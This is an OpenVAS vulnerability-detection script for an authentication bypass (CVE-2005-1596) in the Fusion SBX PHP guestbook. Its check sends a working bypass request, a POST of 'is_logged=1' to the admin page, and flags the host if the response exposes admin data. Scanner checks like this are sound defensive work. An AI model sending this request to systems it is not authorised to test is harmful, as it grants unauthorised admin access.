###############################################################################
# OpenVAS Vulnerability Test
# $Id: fusion_sbx_bypass.nasl 6056 2017-05-02 09:02:50Z teissa $
#
# Fusion SBX Password Bypass and Command Execution
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2005 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# "Dave" <dave@kidindustries.net>
# 2005-05-05 07:03
# Fusion SBX 1.2 password bypass and remote command execution

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.18210");
  script_version("$Revision: 6056 $");
  script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(13575);
  script_cve_id("CVE-2005-1596");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Fusion SBX Password Bypass and Command Execution");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"None at this time");
  script_tag(name:"summary", value:"The remote host is running Fusion SBX, a guest book written in PHP.

  A vulnerability in the remote version of this software allows remote attackers to modify the
  product's settings without knowing the administrator password, in addition by injecting
  arbitrary PHP code to one of the board's settings a remote attacker is able to cause the
  program to execute arbitrary code.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/admin/index.php";

  req = string( "POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: 11\r\n",
                "\r\n",
                "is_logged=1" );
  res = http_keepalive_send_recv( port:port, data:req );

  if( "data/data.db" >< res && "data/ipban.db" >< res ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
